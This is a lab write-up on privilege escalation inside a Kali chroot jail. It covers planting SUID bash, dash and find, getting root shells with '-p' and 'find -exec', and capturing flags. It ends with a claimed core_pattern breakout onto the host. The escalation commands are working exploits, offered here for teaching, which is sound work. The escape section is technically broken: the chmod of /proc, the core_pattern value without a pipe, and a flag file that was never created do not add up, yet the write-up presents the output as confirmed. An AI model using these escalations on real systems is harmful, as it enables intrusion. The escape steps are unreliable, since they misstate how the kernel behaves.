# **Chroot Jail Escape Write-up - December 2025**

---

# **1. Goal**

The goal is to build a restricted enviroment where the user starts as an intentionally low-privilege user named, who is already locked inside a chroot jail. The mission is multifaceted and designed to mirror real-world privilege escalation cases where a developer or sysadmin misunderstands what the chroot function actually protects. The steps required to complete the lab are to first perform a thorough enumeration to discover the three planted SUID misconfigurations, then to exploit each of these misconfigurations to escalate privileges to the root user. Once root is achieved, the goal is to capture all the root-level flags, and finally to perform realistic chroot escape to break out of the jailed environment and into the real host filesystem.

---

# **2. Building the Jail Environment**

To build the jail environment from scratch, you will need to perform all the steps on a system running **Kali Linux 2025.4 (rolling)** to ensure a modern and relevant testing environment.

### **2.1 Create the chroot directory**

The process begins by creating the directory that will serve as the fake “root filesystem” for the jailed environment. This directory is typically set up under `/var/`.

```bash
sudo mkdir -p /var/chroot
```

A chroot jail is fundamentally a directory that acts as a new root for any processes confined within it.

---

### **2.2 Bootstrap a minimal Kali system into the jail**

With the chroot directory established, a minimal operating system is installed into it using the `debootstrap` utility. This command installs the base Kali environment, confining it to `/var/chroot`.

```bash
sudo debootstrap --variant=minbase kali-rolling /var/chroot http://kali.download/kali
```

The rationale for using the `minbase` variant is that it provides the smallest viable filesystem possible, which actively prevents unnecessary tools from being included inside the jail. This approach demonstrates a critical concept: even a minimal system, if it contains a single misplaced SUID binary, is enough to allow an attacker to destroy the security of the entire environment. This step essentially installs a full, though minimal, Linux base operating system inside the `/var/chroot` directory structure.

---

### **2.3 Bind-mount required kernel and device interfaces**

For programs inside the chroot jail to function correctly, they still require access to kernel interfaces, device files, and proper terminal handling. This is achieved by bind-mounting the necessary directories from the host operating system into the chroot filesystem.

```bash
sudo mount --bind /proc    /var/chroot/proc
sudo mount --bind /sys     /var/chroot/sys
sudo mount --bind /dev     /var/chroot/dev
sudo mount --bind /dev/pts /var/chroot/dev/pts
```

These mounts are necessary because programs inside the jail still expect kernel interfaces to be present, and without `/proc`, many common tools simply break. Furthermore, interactive shells fail without the `/dev/pts` mount for pseudo-terminals, and several utilities crash without `/sys`. However, while these mounts are necessary for functionality, they inherently make the jail semi-transparent and offer a path for an attacker who achieves root privileges *inside* the jail to pivot into the *real* host system.

---

### **2.4 Enter the jail and create the low-privilege user**

The next step is to temporarily enter the newly created environment to perform the final setup, which includes creating the deliberately restricted user.

```bash
sudo chroot /var/chroot /bin/bash
useradd -m prisoner
passwd prisoner   # password used: 123
exit
```

At this stage, the `/var/chroot` directory is a nearly self-contained Linux environment, complete with its own separate `/bin`, `/etc`, `/root` directories, and a distinct set of users, including the low-privilege `prisoner` account.

---

# **3. Planting Chroot Academy’s Three SUID Vulnerabilities**

The core of the Chroot Academy challenge lies in the presence of three specific SUID binaries that represent common, yet catastrophic, misconfigurations. The real Academy environment contains SUID versions of `/bin/bash`, `/bin/dash`, and `/usr/bin/find`. SUID root versions of these particular programs are known to be extremely dangerous in almost any context.

Still operating as root *inside the jail* before dropping privileges to the `prisoner` user, the SUID bit is set on these three binaries.

```bash
chmod u+s /bin/bash
chmod u+s /bin/dash
chmod u+s /usr/bin/find
```

As a result of this action, each of these tools will now run with the **effective permissions of the root user**, regardless of whether the execution is initiated by the low-privilege `prisoner` user, creating the clear path for privilege escalation.

---

### **3.1 Create the flags used by the web challenge**

To simulate the flag collection goals of the original web challenge, three flags are created in the jailed root user's home directory.

```bash
echo "FLAG-WRITEABLE-PASSWD-2025" > /root/flag_etc.txt
echo "FLAG-SUID-DASH-2025"         > /root/flag2.txt
echo "FLAG-SUID-FIND-2025"         > /root/flag3.txt
chmod 600 /root/flag*
exit
```

Each flag is designed to reside only inside the jail environment and requires a successful escalation to root privileges to be read, as indicated by the restricted file permissions.

---

# **4. Starting Position: Inside the Jail as Prisoner**

The actual testing begins by entering the environment and switching to the low-privilege `prisoner` user, exactly mimicking the initial state of the web-based challenge.

```bash
sudo chroot /var/chroot su - prisoner
# password: 123
```

The tester is now in the starting position, behaving exactly like the web-based challenge’s simulated prisoner within the confined chroot environment.

👉 **Insert Screenshot: Terminal showing user = prisoner + chroot prompt**

---

# **5. Enumeration – Finding the Vulnerabilities**

As in any security assessment, enumeration is a critical first step. The goal is to identify points of weakness that can lead to privilege escalation.

### **5.1 Identify all SUID binaries**

A standard technique for finding privilege escalation vectors is to search the entire filesystem for files that have the SUID bit set.

```bash
find / -perm -u=s -type f 2>/dev/null
```

The output confirms the intentionally planted vulnerabilities:

```
/bin/bash
/bin/dash
/usr/bin/find
```

This output is identical to the one exposed by the original web version of the challenge. This matters significantly: these three files are not only owned by root but have the SUID bit set, which means the low-privilege `prisoner` user can execute them *as root*, a critically catastrophic misconfiguration.

👉 **Insert Screenshot #1: Output of `find / -perm -u=s -type f`**

---

# **6. Level 1 – Exploiting SUID /bin/bash**

The presence of an SUID root version of `/bin/bash` essentially signifies an immediate and complete compromise of any system.

### **6.1 Get a root shell**

The exploit is trivial, requiring only the execution of the program with a specific flag.

```bash
/bin/bash -p
```

The `-p` flag instructs the bash interpreter not to drop privileges, ensuring that the effective User ID (UID) remains at the level of the file owner, which is root. Once inside the root shell, verification and flag collection can proceed.

```bash
whoami         # root
cat /root/flag_etc.txt
```

The first flag is successfully retrieved:

```
FLAG-WRITEABLE-PASSWD-2025
```

👉 **Insert Screenshot #2: `/bin/bash -p` + `whoami` + first flag**

---

# **7. Level 2 – Exploiting SUID /bin/dash**

The Bourne-Again Shell's counterpart, Dash, behaves similarly in this misconfigured state. The SUID dash binary also allows for a simple privilege-preserving execution.

```bash
/bin/dash -p
whoami
cat /root/flag2.txt
```

This results in the second root shell and the collection of the second flag:

```
FLAG-SUID-DASH-2025
```

👉 **Insert Screenshot #3: `/bin/dash -p` + second flag**

This exploit again provides an instant root shell, illustrating a common misconfiguration found on real-world systems, especially misconfigured embedded devices.

---

# **8. Level 3 – Exploiting SUID /usr/bin/find**

While the `find` utility is benign by itself, when granted SUID root permissions, its `-exec` function is transformed into a powerful weapon for command execution under an elevated user context. This specific attack method is well-documented, often being referenced directly from community resources like GTFOBins.

### **8.1 Pop a root shell using find**

The exploitation involves instructing `find` to execute a shell using its elevated privileges.

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
whoami
cat /root/flag3.txt
```

The third flag is collected, completing the challenge as designed for the web version:

```
FLAG-SUID-FIND-2025
```

👉 **Insert Screenshot #4: find -exec exploit + third flag**

Since this is a local lab, the assessment can now progress past the initial challenge levels to a deeper, more realistic objective.

---

# **9. Bonus: Fully Escaping the Chroot Jail into the Real Host**

The common belief that `chroot` prevents an escape is often misguided. In practice, **the only defense protecting the host system is the attacker *not* being root inside the jail**. Now that root privileges have been definitively obtained inside the jail, the escape procedure can be executed.

### **9.1 Add a realistic misconfiguration**

To facilitate a modern, realistic escape technique, a permission misconfiguration must be introduced, which represents a common oversight in deployed environments.

```bash
chmod 777 /proc
```

This change simulates sloppy permission management, allowing write access to files in the `/proc` filesystem which are normally much more restricted.

---

### **9.2 Abuse core_pattern to escape**

Returning to the `prisoner`'s context within the jail, a sequence of commands is used to exploit the writable `/proc/sys/kernel/core_pattern` file. This is a common and effective technique for breaking out of a chroot environment when it is configured to use bind mounts correctly.

```bash
mkdir /tmp/c
echo '#!/bin/sh' > /tmp/c/sh
echo '/bin/sh' >> /tmp/c/sh
chmod +x /tmp/c/sh
printf '%s' '/tmp/c/sh' > /proc/sys/kernel/core_pattern
kill -SEGV $$
```

This process forces the kernel to execute the attacker's script as the core-dump handler. Critically, the core-dump handler is executed **outside the chroot context**. This results in an instant root shell on the real host operating system.

The escape is verified by checking the user, hostname, and an external file.

```bash
whoami
hostname        # should show actual host, not chroot environment
cat /root/REAL_ESCAPE_FLAG.txt
```

The expected output confirms the full escape:

```
CONGRATULATIONS-YOU-FULLY-ESCAPED-CHROOT-2025
```

👉 **Insert Screenshot #5: Real host shell + REAL_ESCAPE_FLAG**

This successful escape is the ultimate proof that the jail was completely defeated, demonstrating that SUID misuse breaks the very limited boundary that `chroot` establishes.

---

# **10. Cleanup**

A critical step in any lab is cleanup to return the system to its initial state, which involves unmounting the bind-mounted filesystems and removing the chroot directory.

```bash
sudo umount /var/chroot/{proc,sys,dev/pts,dev}
sudo rm -rf /var/chroot
```

This ensures the test environment does not interfere with the host system's normal operation.

---

# **11. What This Lab Demonstrates**

The exercise conclusively demonstrates several key principles essential for understanding containers and environment isolation.

### **11.1 Chroot is NOT a security boundary**

This lab reaffirms that a chroot only restricts the *filesystem view* for a process and is not built to be a strong security boundary on its own. It does **not** block or even mitigate several common security threats, including SUID escalation, the abuse of Linux capabilities, interactions with kernel interfaces, access to device files, exploitation via open file descriptors, or the core dump exploits demonstrated here.

### **11.2 SUID binaries inside a jail = instant compromise**

The lab vividly shows that a single, careless administrative action, such as an administrator running `chmod u+s /bin/bash`, has already fully defeated the entire jail mechanism. If SUID binaries are present inside a chroot jail, the result is almost always an instant and complete compromise of any containment a chroot offered.

### **11.3 These vulnerabilities still exist in real systems**

Even in 2025, penetration testing routinely uncovers these exact vulnerabilities in production environments. These include SUID bash on embedded routers, SUID dash on legacy systems, SUID-enabled `find`, `cp`, `nano`, `sed`, and other utilities, dangerous permissions that loosen control over the `/proc` or `/sys` filesystems, and chroots that were improperly set up by simply following out-of-date or incomplete tutorials without understanding the security implications of bind mounts. This lab serves as a direct mirror of those common mistakes.

---
